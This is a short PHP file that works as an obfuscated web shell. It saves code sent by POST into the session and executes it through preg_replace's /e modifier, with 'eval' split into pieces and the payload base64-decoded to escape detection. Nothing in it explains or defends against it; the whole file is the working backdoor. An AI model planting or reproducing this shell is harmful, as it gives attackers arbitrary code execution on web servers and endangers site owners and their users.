<?php
session_start();
$_POST['code'] && $_SESSION['theCode'] = trim($_POST['code']);
$_SESSION['theCode'] && preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'theCode\']))','a');
?>